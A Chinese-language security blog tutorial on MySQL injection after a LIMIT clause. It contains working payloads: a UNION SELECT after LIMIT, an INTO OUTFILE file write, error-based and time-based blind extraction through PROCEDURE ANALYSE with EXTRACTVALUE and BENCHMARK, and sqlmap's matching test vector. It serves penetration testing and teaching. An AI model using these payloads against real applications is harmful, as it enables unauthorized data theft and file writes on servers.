---
layout: post
title:  "mysql注入之limit注入"
date:   2018-01-25 21:41:45 +0800
categories: [mysql注入, limit注入]
---
> 这个limit注入为何拿出来提呢？定有它的特别之处

# 0X00 官方文档中的 limit
```sql
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```
和之前的order by注入的文档是同一个，都是介绍select的文档，不过和order by不同的是limit后面可以跟的内容中没有表达式，并且可以使用的关键字有限只有两个“INTO file”、“procedure” 

# 0X01 单独的limit
单独的limit的出现的话，其实并不常见，其的利用方式除了前面介绍的limit后面的两个关键字外，还可以使用union，union是mysql 4.0版本出现的一个新的特性，也就是说union使用条件是mysql>4.0，由于mysql 4.0出现在2003年，现在遇到的mysql基本都可以满足这个条件，利用的话就像下面这样

```sql
mysql> select * from users limit 1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
```
没什么特别的

# 0X02 order by之后的limit
首先介绍下为什么这种情况的话比较的多，原因其实也简单，如果order by出现在union的子句中，那么必须加上limit，否则order by不生效，官方文档说明如下

```
Use of ORDER BY for individual SELECT statements implies nothing about the order in which the rows appear in the final result because UNION by default produces an unordered set of rows. Therefore, the use of ORDER BY in this context is typically in conjunction with LIMIT, so that it is used to determine the subset of the selected rows to retrieve for the SELECT, even though it does not necessarily affect the order of those rows in the final UNION result. If ORDER BY appears without LIMIT in a SELECT, it is optimized away because it will have no effect anyway.
```

这种情况下我们将不能再利用union，原因很简单，详见[SQL注入之order by注入](http://lietolive.com/sql/order%20by%E6%B3%A8%E5%85%A5/2018/01/13/SQL%E6%B3%A8%E5%85%A5orderBy%E6%B3%A8%E5%85%A5.html)。于是，我们的选择只剩下“INTO file” 和 “procedure”

1. “INTO file”写文件

```sql
mysql> select * from users order by id limit 1 into outfile '/xxxxx/1.txt';
```

2. procedure

```shell
PROCEDURE ANALYSE() is deprecated as of MySQL 5.7.18, and is removed in MySQL 8.0
```
但是之前wooyunZone上得出的结论是只有5.0<mysql<5.66才可以，所以我本地也没有复线，总结下利用方式吧

报错
```shell
select * from users order by id limit 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```

时间 - 只能使用BENCHMARK
```shell
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

# 0X03 sqlmap 表现情况

```shell
    <test>
        <title>MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
        <stype>5</stype>
        <level>3</level>
        <risk>2</risk>
        <clause>1,2,3,4,5</clause>
        <where>1</where>
        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)</vector>
        <request>
            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&gt;= 5.0.12</dbms_version>
        </details>
    </test>
```
从这段payload中可以发现，sqlmap是拥有这种场景下的检测能力的，并且判断的mysql版本和wooyunZone中所讨论的一致

# 0X04 参考

1、[Testing for MySQL](https://www.owasp.org/index.php/Testing_for_MySQL)

2、[mysql4.0 4.1 5.0 三个版本的特性对比](http://kong1616.iteye.com/blog/674561)

3、[UNION Syntax](https://dev.mysql.com/doc/refman/5.7/en/union.html)

4、[Using PROCEDURE ANALYSE](https://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html)

5、[技术分享：Mysql注入点在limit关键字后面的利用方法](http://www.freebuf.com/articles/web/57528.html)